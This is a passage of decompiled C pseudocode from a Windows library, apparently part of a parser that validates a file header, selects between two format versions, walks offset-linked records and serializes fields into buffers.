  *a1 = off_100FBF5C;
  *a1 = &off_10104108;
  a1[1] = off_100FBF5C;
  a1[1] = &off_10104148;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[2] = 0;
  a1[3] = i;
  a1[4] = operator new(8 * i);
  sub_10018FD5(a1 + 5, 0x10u);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104108: using guessed type int (__thiscall *off_10104108)(void *Block, char);
// 10104148: using guessed type int (__thiscall *off_10104148)(void *Block, char);

//----- (1004A9AF) --------------------------------------------------------
void __thiscall sub_1004A9AF(_DWORD *this)
{
  *this = &off_10104108;
  sub_100068A5(this + 5);
  sub_1004A5F1((int)(this + 1));
  sub_10039F05(this);
}
// 10104108: using guessed type int (__thiscall *off_10104108)(void *Block, char);

//----- (1004A9F2) --------------------------------------------------------
bool __thiscall sub_1004A9F2(_DWORD *this, double *a2)
{
  int v3; // edi

  v3 = sub_1004ACD5(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *a2 == *(double *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
}

//----- (1004AA2E) --------------------------------------------------------
char __thiscall sub_1004AA2E(_DWORD *this, double *a2)
{
  int v3; // edi

  v3 = sub_1004ACD5(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *a2 != *(double *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1004AA80) --------------------------------------------------------
int __thiscall sub_1004AA80(_DWORD *this, double *a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = sub_1004ACD5(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *a2 != *(double *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) )
  {
    (*(void (__thiscall **)(_DWORD *, double *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000D17D(v6, &word_101749EC);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000D3AD(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (1004AAFB) --------------------------------------------------------
int __thiscall sub_1004AAFB(_DWORD *this, double *a2)
{
  double *v3; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v3 = a2;
  v4 = sub_1004ACD5(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *v3 != *(double *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1004AB5D) --------------------------------------------------------
void __thiscall sub_1004AB5D(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // [esp+10h] [ebp-18h] BYREF
  LONG v6[4]; // [esp+14h] [ebp-14h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  sub_1000D372(&v5, a3);
  v7 = 0;
  v4 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_10001236(v6, (LONG *)(v4 + 4));
  v7 = -1;
  sub_1000D3AD(&v5);
}
// 1004AB5D: using guessed type LONG var_14[4];

//----- (1004ABA4) --------------------------------------------------------
_DWORD *__thiscall sub_1004ABA4(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 1;
  *a2 = off_100FBF5C;
  *a2 = &off_10104148;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1004A823(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104148: using guessed type int (__thiscall *off_10104148)(void *Block, char);

//----- (1004ABFE) --------------------------------------------------------
int __thiscall sub_1004ABFE(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (1004AC12) --------------------------------------------------------
void *__thiscall sub_1004AC12(void *Block, char a2)
{
  sub_1004A5F1((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004AC2E) --------------------------------------------------------
_DWORD *__thiscall sub_1004AC2E(_DWORD *Block, char a2)
{
  sub_1004A9AF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004AC4A) --------------------------------------------------------
_DWORD *__stdcall sub_1004AC4A(_DWORD *a1)
{
  unsigned int v1; // edi
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10103918;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  v2 = 0;
  a1[1] = 0;
  a1[2] = v1;
  v3 = (20 * (unsigned __int64)v1) >> 32 != 0 ? -1 : 20 * v1;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = v1;
    `eh vector constructor iterator'(
      v4 + 1,
      0x14u,
      v1,
      (void (__thiscall *)(void *))sub_10038185,
      (void (__thiscall *)(void *))sub_100380FA);
  }
  a1[3] = v2;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103918: using guessed type int (__thiscall *off_10103918)(void *Block, char);

//----- (1004ACD5) --------------------------------------------------------
int __userpurge sub_1004ACD5@<eax>(_DWORD *a1@<ebx>, double *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *(double *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) == *a2 )
        break;
      if ( *(double *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) <= *a2 )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1004AD60) --------------------------------------------------------
int __thiscall sub_1004AD60(_DWORD *this, _DWORD *a2, char a3)
{
  int v4; // eax
  int v5; // edx
  int v7; // ebx
  _DWORD *v8; // edi
  unsigned int v9; // ecx
  int v10; // ecx
  unsigned int v11; // eax
  int v12; // eax
  _DWORD *v13; // eax
  int v14; // ecx
  int v15; // eax
  const void *v16; // [esp-8h] [ebp-54h]
  size_t v17; // [esp-4h] [ebp-50h]
  char v18; // [esp+12h] [ebp-3Ah]
  int v19; // [esp+14h] [ebp-38h] BYREF
  unsigned int v20; // [esp+18h] [ebp-34h]
  char v21[4]; // [esp+1Ch] [ebp-30h]
  int Src; // [esp+20h] [ebp-2Ch] BYREF
  _DWORD *v23; // [esp+24h] [ebp-28h]
  int v24; // [esp+28h] [ebp-24h]
  int v25; // [esp+2Ch] [ebp-20h] BYREF
  unsigned int v26; // [esp+30h] [ebp-1Ch]
  int v27; // [esp+48h] [ebp-4h]

  v23 = this;
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  v5 = 0;
  this[11] = v4;
  *(_DWORD *)v21 = 0;
  v18 = 0;
  v24 = a3 & 1;
  if ( (a3 & 1) != 0 )
  {
    if ( a2[3] < 4u )
      return 0;
    sub_1000B713(a3 & 1, a2, 0, v4);
    v5 = 4;
    *(_DWORD *)v21 = 1;
  }
  if ( this[11] )
    return v5;
  v7 = v5 + 2;
  if ( a2[3] < (unsigned int)(v5 + 2) )
    return 0;
  v8 = this + 1;
  (*(void (__thiscall **)(_DWORD *, int *))(*v8 + 48))(v8, &v25);
  v27 = 0;
  v19 = 0;
  v20 = 0;
  if ( v26 )
  {
    do
    {
      v19 = *(unsigned __int16 *)(*(int (__thiscall **)(int *, unsigned int))(v25 + 44))(&v25, v20);
      v10 = *(_DWORD *)((*(int (__thiscall **)(_DWORD *, int *))(*v8 + 16))(v8, &v19) + 12);
      v11 = a2[3] - v7;
      Src = v10;
      v9 = v10 + 4;
      if ( v11 >= v9 )
      {
        v9 = (unsigned int)v23;
        if ( ((unsigned __int16)v19 & (_WORD)v23[10]) != 0 )
        {
          v12 = sub_1000B49B(a2, (int)v23);
          memcpy((void *)(v7 + v12), &Src, 4u);
          v17 = Src;
          v13 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v8 + 16))(v8, &v19);
          v16 = (const void *)sub_1000B4B8(v13);
          v15 = sub_1000B49B(a2, v14);
          memcpy((void *)(v15 + v7 + 4), v16, v17);
          *(_BYTE *)(a2[1] + 8) = 1;
          v7 += Src + 4;
          *(_DWORD *)v21 |= v19;
        }
      }
      else
      {
        v18 = 1;
      }
      ++v20;
    }
    while ( v20 < v26 );
    if ( v18 )
    {
      if ( (_WORD)v24 )
        sub_1000B713(v9, a2, 0, 1);
    }
  }
  sub_1000B768(v9, a2, 4 * (a3 & 1), *(__int16 *)v21);
  v27 = -1;
  sub_1003A1C7((int)&v25);
  return v7;
}
// 1004AE91: variable 'v14' is possibly undefined
// 1004AEDF: variable 'v9' is possibly undefined

//----- (1004AF1C) --------------------------------------------------------
int __stdcall sub_1004AF1C(int a1, __int16 a2, int a3, int a4)
{
  *(_DWORD *)a1 = &off_10103AF0;
  *(_DWORD *)(a1 + 4) = off_100FBF5C;
  *(_DWORD *)(a1 + 4) = &off_10103B00;
  sub_1003AD43((_DWORD *)(a1 + 8));
  sub_1003EF32((_DWORD *)(a1 + 24));
  *(_DWORD *)(a1 + 44) = 0;
  *(_WORD *)(a1 + 40) = a2;
  sub_1000D372((_DWORD *)(a1 + 48), (int)&a3);
  sub_1000D3AD(&a3);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103AF0: using guessed type int (__thiscall *off_10103AF0)(void *Block, char);
// 10103B00: using guessed type int (__thiscall *off_10103B00)(void *Block, char);

//----- (1004AF94) --------------------------------------------------------
void __stdcall sub_1004AF94(_DWORD *a1)
{
  sub_10020B81(a1 + 22);
  sub_1004C692(a1 + 13);
  sub_1001584F((int)(a1 + 9));
  sub_1004C692(a1);
}

//----- (1004AFDD) --------------------------------------------------------
int __thiscall sub_1004AFDD(_DWORD *this, unsigned __int64 a2, int a3)
{
  int v3; // edi
  int v4; // eax
  void *v5; // eax
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rax
  void *v10; // eax
  int v11; // esi
  int v12; // eax
  unsigned int v13; // edx
  int v14; // esi
  int *v15; // ecx
  int v16; // edx
  int v17; // eax
  int v18; // ecx
  int v19; // esi
  int *v20; // ecx
  int v21; // eax
  __int64 v22; // rax
  int v23; // edx
  int v24; // eax
  int v25; // [esp-54h] [ebp-100h] BYREF
  int v26; // [esp-50h] [ebp-FCh]
  __int64 v27; // [esp-4Ch] [ebp-F8h]
  __int64 v28; // [esp-44h] [ebp-F0h]
  int v29; // [esp-34h] [ebp-E0h]
  int v30; // [esp-24h] [ebp-D0h]
  int v31; // [esp-14h] [ebp-C0h]
  int v32; // [esp-4h] [ebp-B0h]
  __int64 v33; // [esp+10h] [ebp-9Ch]
  int v34; // [esp+18h] [ebp-94h]
  int v35; // [esp+1Ch] [ebp-90h]
  int v36[5]; // [esp+24h] [ebp-88h] BYREF
  int v37[5]; // [esp+38h] [ebp-74h] BYREF
  int v38[5]; // [esp+4Ch] [ebp-60h] BYREF
  int v39[3]; // [esp+60h] [ebp-4Ch] BYREF
  unsigned int v40; // [esp+6Ch] [ebp-40h]
  _DWORD *v41; // [esp+70h] [ebp-3Ch]
  void *v42; // [esp+74h] [ebp-38h]
  unsigned int v43; // [esp+7Ch] [ebp-30h]
  int v44[4]; // [esp+80h] [ebp-2Ch] BYREF
  unsigned int v45; // [esp+90h] [ebp-1Ch]
  char v46; // [esp+95h] [ebp-17h] BYREF
  char v47; // [esp+96h] [ebp-16h] BYREF
  char v48[17]; // [esp+97h] [ebp-15h] BYREF
  int v49; // [esp+A8h] [ebp-4h]

  v3 = (int)this;
  v41 = this;
  v49 = 0;
  v4 = this[27];
  if ( v4 != 100 )
  {
    this[27] = v4 + 1;
LABEL_7:
    v45 = 0;
    v47 = 0;
    v48[0] = 0;
    v46 = 0;
    if ( !a2 || a2 >= 0x7FFFFFFFFFFFFFFFi64 )
      return 6;
    sub_100223C7(*(void **)(v3 + 88), (int)v44);
    LOBYTE(v49) = 1;
    v6 = a2 + *(_QWORD *)(*(_DWORD *)(v3 + 100) + 32);
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 68))(
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 8),
      v6,
      HIDWORD(v6),
      0);
    if ( (*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(v3 + 88) + 16))(*(_DWORD *)(v3 + 88), &v47) != 1 )
    {
      LOBYTE(v49) = 0;
      sub_10022419(v44);
      v31 = 7;
      return v32;
    }
    v7 = a2 + *(_QWORD *)(*(_DWORD *)(v3 + 100) + 40);
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 68))(
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 8),
      v7,
      HIDWORD(v7),
      0);
    if ( (*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(v3 + 88) + 16))(*(_DWORD *)(v3 + 88), v48) != 1 )
    {
      LOBYTE(v49) = 0;
      sub_10022419(v44);
      v30 = 8;
      return v32;
    }
    v8 = a2 + *(_QWORD *)(*(_DWORD *)(v3 + 100) + 48);
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 68))(
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 8),
      v8,
      HIDWORD(v8),
      0);
    if ( (*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(v3 + 88) + 16))(*(_DWORD *)(v3 + 88), &v46) != 1 )
    {
      LOBYTE(v49) = 0;
      sub_10022419(v44);
      v29 = 9;
      return v32;
    }
    if ( !v46 )
    {
LABEL_16:
      LOBYTE(v49) = 0;
      sub_10022419(v44);
      return 0;
    }
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 68))(
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 8),
      a2,
      HIDWORD(a2),
      0);
    while ( 1 )
    {
      while ( 1 )
      {
        v40 = 0;
        if ( (unsigned __int64)v45 >= *(_QWORD *)(*(_DWORD *)(v3 + 100) + 48) )
          goto LABEL_16;
        v10 = *(void **)(v3 + 104);
        if ( v10 && WaitForSingleObjectEx(v10, 0, 1) != 258 )
        {
          LOBYTE(v49) = 0;
          sub_10022419(v44);
          return 16;
        }
        if ( v47 )
          break;
        if ( v48[0] < 4u )
        {
          LOBYTE(v49) = 0;
          sub_10022419(v44);
          HIDWORD(v28) = 11;
          return v32;
        }
        sub_1000B1F3((void *)(unsigned __int8)v48[0], (int)v36, 0);
        LOBYTE(v49) = 4;
        LOBYTE(v34) = v48[0];
        v33 = ((__int64 (__thiscall *)(_DWORD))*(_DWORD *)(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 72))(*(_DWORD *)(*(_DWORD *)(v3 + 88) + 8));
        v21 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v3 + 88) + 12))(*(_DWORD *)(v3 + 88), v36);
        if ( v21 != (unsigned __int8)v48[0] )
        {
          LOBYTE(v49) = 1;
          sub_1000B3DF(v36);
          LOBYTE(v49) = 0;
          sub_10022419(v44);
          LODWORD(v28) = 12;
          return v32;
        }
        v42 = &v25;
        sub_1000B36F(v36, (int)&v25);
        LOBYTE(v49) = 4;
        LODWORD(v22) = sub_1004C108(0, v3, v25, v26, v27, SHIDWORD(v27), v28);
        if ( v22 )
        {
          v42 = &v25;
          sub_1000B36F(v36, (int)&v25);
          LOBYTE(v49) = 4;
          v39[0] = sub_1004C108(0, v3, v25, v26, v27, SHIDWORD(v27), v28);
          v39[1] = v23;
          v24 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)a3 + 16))(a3, v39);
          *(_QWORD *)v24 = v33;
          *(_DWORD *)(v24 + 8) = v34;
          *(_DWORD *)(v24 + 12) = v35;
          v3 = (int)v41;
        }
        LOBYTE(v49) = 1;
        v20 = v36;
LABEL_48:
        sub_1000B3DF(v20);
        v45 += (unsigned __int8)v48[0];
      }
      v11 = *(_DWORD *)(v3 + 88);
      v28 = 2i64;
      v27 = *(_QWORD *)(*(_DWORD *)(v3 + 100) + 56);
      (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(v11 + 8) + 68))(
        *(_DWORD *)(v11 + 8),
        a2 + v45 + 2 * v27,
        (a2 + __PAIR64__(v40, v45) + 2 * v27) >> 32,
        0);
      if ( **(_BYTE **)(v3 + 100) == 23 )
      {
        v12 = sub_1004C0E4((int)v44);
        v43 = v13;
      }
      else
      {
        v12 = (*(int (__thiscall **)(int *))(v44[0] + 56))(v44);
        v43 = 0;
      }
      v14 = v12;
      if ( (v12 || v43) && v43 <= 0x7FFFFFFF && (v43 < 0x7FFFFFFF || v12 != -1) )
      {
        sub_1000B1F3(*(void **)(*(_DWORD *)(v3 + 100) + 56), (int)v37, 0);
        LOBYTE(v49) = 2;
        sub_1000B1F3(*(void **)(*(_DWORD *)(v3 + 100) + 56), (int)v38, 0);
        LOBYTE(v49) = 3;
        v15 = *(int **)(*(_DWORD *)(v3 + 88) + 8);
        v16 = *v15;
        LODWORD(v27) = 0;
        (*(void (__thiscall **)(int *, _DWORD, _DWORD, _DWORD))(v16 + 68))(
          v15,
          a2 + v45,
          (a2 + __PAIR64__(v40, v45)) >> 32,
          0);
        if ( *(_QWORD *)(*(_DWORD *)(v3 + 100) + 56) != (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v3 + 88)
                                                                                             + 12))(
                                                          *(_DWORD *)(v3 + 88),
                                                          v37) )
        {
          LOBYTE(v49) = 2;
          sub_1000B3DF(v38);
          LOBYTE(v49) = 1;
          sub_1000B3DF(v37);
          LOBYTE(v49) = 0;
          sub_10022419(v44);
          return v32;
        }
        (*(void (__fastcall **)(_DWORD, _DWORD, int, unsigned int, _DWORD))(**(_DWORD **)(*(_DWORD *)(v3 + 88) + 8) + 68))(
          *(_DWORD *)(*(_DWORD *)(v3 + 88) + 8),
          0,
          v14,
          v43,
          0);
        v17 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v3 + 88) + 12))(*(_DWORD *)(v3 + 88), v38);
        v18 = *(_DWORD *)(v3 + 100);
        if ( v17 == *(_DWORD *)(v18 + 56) && !*(_DWORD *)(v18 + 60) )
        {
          if ( sub_1000B4E7(v37, v38) )
          {
            v19 = sub_1004AFDD(v14, v43, a3);
            if ( v19 )
            {
              LOBYTE(v49) = 2;
              sub_1000B3DF(v38);
              LOBYTE(v49) = 1;
              sub_1000B3DF(v37);
              LOBYTE(v49) = 0;
              sub_10022419(v44);
              return v19;
            }
          }
          LOBYTE(v49) = 2;
          sub_1000B3DF(v38);
          LOBYTE(v49) = 1;
          v20 = v37;
          goto LABEL_48;
        }
        v45 += (unsigned __int8)v48[0];
        LOBYTE(v49) = 2;
        sub_1000B3DF(v38);
        LOBYTE(v49) = 1;
        sub_1000B3DF(v37);
      }
      else
      {
        v45 += (unsigned __int8)v48[0];
      }
    }
  }
  v5 = (void *)this[26];
  if ( !v5 || WaitForSingleObjectEx(v5, 3u, 1) == 258 )
  {
    *(_DWORD *)(v3 + 108) = 0;
    goto LABEL_7;
  }
  return 16;
}
// 1004B1D6: variable 'v13' is possibly undefined
// 1004B409: variable 'v22' is possibly undefined
// 1004B42C: variable 'v23' is possibly undefined
// 1004AFDD: using guessed type char var_15[17];
// 1004AFDD: using guessed type int var_74[5];
// 1004AFDD: using guessed type int var_60[5];
// 1004AFDD: using guessed type int var_88[5];

//----- (1004B47E) --------------------------------------------------------
char __stdcall sub_1004B47E(char *a1, int a2, int a3, int *a4)
{
  int *v4; // esi
  int *v5; // ecx
  int v6; // eax
  char v7; // bl
  int v9; // eax
  int v11; // eax
  int *v12; // edi
  int v13; // edx
  int v14; // edx
  int v15; // [esp-14h] [ebp-5Ch] BYREF
  __int64 v16; // [esp-10h] [ebp-58h]
  __int64 v17; // [esp-8h] [ebp-50h]
  int v18[5]; // [esp+10h] [ebp-38h] BYREF
  int v19; // [esp+24h] [ebp-24h]
  int v20; // [esp+28h] [ebp-20h]
  int v21; // [esp+2Ch] [ebp-1Ch]
  int v22; // [esp+30h] [ebp-18h]
  int v23; // [esp+44h] [ebp-4h]
  void *v24; // [esp+50h] [ebp+8h]

  if ( !(*(unsigned __int8 (__thiscall **)(char *, int *))(*((_DWORD *)a1 + 13) + 8))(a1 + 52, &a2) )
    return 0;
  v4 = (int *)(*(int (__thiscall **)(char *, int *))(*((_DWORD *)a1 + 13) + 16))(a1 + 52, &a2);
  v5 = *(int **)(*((_DWORD *)a1 + 22) + 8);
  v6 = *v5;
  v19 = *v4++;
  v20 = *v4++;
  v21 = *v4;
  HIDWORD(v17) = 0;
  v22 = v4[1];
  (*(void (__thiscall **)(int *, int, int, _DWORD))(v6 + 68))(v5, v19, v20, 0);
  sub_1000B1F3((void *)(unsigned __int8)v21, (int)v18, 0);
  v7 = 0;
  v23 = 0;
  (*(void (__thiscall **)(_DWORD, int *))(**((_DWORD **)a1 + 22) + 12))(*((_DWORD *)a1 + 22), v18);
  v9 = *((_DWORD *)a1 + 25);
  v17 = 3i64;
  v16 = *(_QWORD *)(v9 + 56);
  if ( 3 * v16 == v18[3] )
  {
    sub_1000B36F(v18, (int)&v15);
    LOBYTE(v23) = 0;
    v11 = sub_1004C108(0, (int)a1, v15, v16, SHIDWORD(v16), v17, SHIDWORD(v17));
    v12 = a4;
    *a4 = v11;
    v12[1] = v13;
    v24 = *(void **)(*((_DWORD *)a1 + 25) + 56);
    a4 = &v15;
    sub_1000B36F(v18, (int)&v15);
    LOBYTE(v23) = 0;
    v12[2] = sub_1004C108(v24, (int)a1, v15, v16, SHIDWORD(v16), v17, SHIDWORD(v17));
    v12[3] = v14;
    *((_WORD *)v12 + 8) = sub_1000B746(v18, 2 * *(_DWORD *)(*((_DWORD *)a1 + 25) + 56));
    v7 = 1;
  }
  v23 = -1;
  sub_1000B3DF(v18);
  return v7;
}
// 1004B543: variable 'v13' is possibly undefined
// 1004B571: variable 'v14' is possibly undefined

//----- (1004B599) --------------------------------------------------------
void *__stdcall sub_1004B599(_DWORD *a1, void *a2, char a3, int a4)
{
  int v4; // eax
  int *v5; // ecx
  int *v6; // esi
  int v7; // eax
  int v8; // ebx
  int v10[5]; // [esp+10h] [ebp-38h] BYREF
  int v11; // [esp+24h] [ebp-24h]
  int v12; // [esp+28h] [ebp-20h]
  int v13; // [esp+2Ch] [ebp-1Ch]
  int v14; // [esp+30h] [ebp-18h]
  int v15; // [esp+34h] [ebp-14h]
  int v16; // [esp+44h] [ebp-4h]

  v15 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, char *))(*a1 + 8))(a1, &a3) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, char *))(*a1 + 16))(a1, &a3);
    v5 = *(int **)(a1[22] + 8);
    v6 = (int *)v4;
    v7 = *v5;
    v11 = *v6++;
    v12 = *v6++;
    v13 = *v6;
    v14 = v6[1];
    (*(void (__thiscall **)(int *, int, int, _DWORD))(v7 + 68))(v5, v11, v12, 0);
    v8 = (unsigned __int8)v13;
    sub_1000B1F3((void *)(unsigned __int8)v13, (int)v10, 0);
    v16 = 1;
    if ( v8 == (*(int (__thiscall **)(_DWORD, int *))(*(_DWORD *)a1[22] + 12))(a1[22], v10) )
      sub_1000B36F(v10, (int)a2);
    else
      sub_1000B1F3(0, (int)a2, 0);
    v15 = 1;
    LOBYTE(v16) = 0;
    sub_1000B3DF(v10);
  }
  else
  {
    sub_1000B1F3(0, (int)a2, 0);
    v16 = 0;
    v15 = 1;
  }
  return a2;
}
// 1004B599: using guessed type int var_38[5];

//----- (1004B655) --------------------------------------------------------
int __userpurge sub_1004B655@<eax>(_DWORD *a1@<esi>, unsigned __int64 a2, unsigned __int64 a3)
{
  int result; // eax

  result = sub_1004AFDD(a1, a2, (int)(a1 + 13));
  if ( !result )
    return sub_1004AFDD(a1, a3, (int)a1);
  return result;
}

//----- (1004B684) --------------------------------------------------------
char __stdcall sub_1004B684(int a1, int a2, _DWORD *a3)
{
  LONG *v3; // eax
  int v4; // eax
  int v5; // ecx
  int v7[5]; // [esp+14h] [ebp-28h] BYREF
  char v8; // [esp+2Bh] [ebp-11h]
  int v9; // [esp+38h] [ebp-4h]

  v3 = (LONG *)sub_1000B1F3((void *)*(unsigned __int16 *)(a2 + 16), (int)v7, 0);
  v9 = 0;
  sub_1000B3BD(v3, (int)a3);
  v9 = -1;
  sub_1000B3DF(v7);
  v8 = 0;
  v9 = 1;
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(a1 + 88) + 8) + 68))(
    *(_DWORD *)(*(_DWORD *)(a1 + 88) + 8),
    *(_DWORD *)(a2 + 8),
    *(_DWORD *)(a2 + 12),
    0);
  v4 = (*(int (__thiscall **)(_DWORD, _DWORD *))(**(_DWORD **)(a1 + 88) + 12))(*(_DWORD *)(a1 + 88), a3);
  v5 = *(unsigned __int16 *)(a2 + 16);
  if ( v5 == v4 && (!*(_BYTE *)(a1 + 96) || sub_1004D5E3(v5, a3, (_BYTE *)(a1 + 96))) )
    return 1;
  return v8;
}
// 1004B684: using guessed type int var_28[5];

//----- (1004B727) --------------------------------------------------------
int __thiscall sub_1004B727(int this)
{
  int v3; // eax
  int v4; // edx
  int v5; // eax
  unsigned int v6; // edx
  int v7; // esi
  int v8; // ecx
  int v9; // eax
  int v10; // edx
  int v11; // esi
  int v12; // eax
  int v13; // [esp-Ch] [ebp-60h]
  int v14[4]; // [esp+10h] [ebp-44h] BYREF
  char v15[12]; // [esp+20h] [ebp-34h] BYREF
  int v16; // [esp+2Ch] [ebp-28h]
  unsigned int v17; // [esp+34h] [ebp-20h]
  unsigned __int64 v18; // [esp+38h] [ebp-1Ch]
  char v19; // [esp+42h] [ebp-12h] BYREF
  char v20[13]; // [esp+43h] [ebp-11h] BYREF
  int v21; // [esp+50h] [ebp-4h]

  v21 = 0;
  v20[0] = 0;
  v19 = 0;
  sub_100223C7(*(void **)(this + 88), (int)v14);
  LOBYTE(v21) = 1;
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
    *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
    0,
    0,
    0);
  if ( sub_100224AC(v14) != 1313096225 )
  {
    LOBYTE(v21) = 0;
    sub_10022419(v14);
    return 1;
  }
  (*(void (__thiscall **)(_DWORD, int, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
    *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
    10,
    0,
    0);
  if ( (*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 88) + 16))(*(_DWORD *)(this + 88), v20) != 1 )
    goto LABEL_20;
  if ( v20[0] == 14 )
  {
    *(_DWORD *)(this + 100) = &unk_100FF618;
  }
  else
  {
    if ( v20[0] != 23 )
    {
LABEL_20:
      LOBYTE(v21) = 0;
      sub_10022419(v14);
      return v13;
    }
    *(_DWORD *)(this + 100) = &unk_100FF658;
  }
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
    *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
    *(_DWORD *)(*(_DWORD *)(this + 100) + 16),
    *(_DWORD *)(*(_DWORD *)(this + 100) + 20),
    0);
  if ( **(_BYTE **)(this + 100) == 23 )
  {
    v3 = sub_1004C0E4((int)v14);
    HIDWORD(v18) = v4;
  }
  else
  {
    v3 = (*(int (__thiscall **)(int *))(v14[0] + 56))(v14);
    HIDWORD(v18) = 0;
  }
  LODWORD(v18) = v3;
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
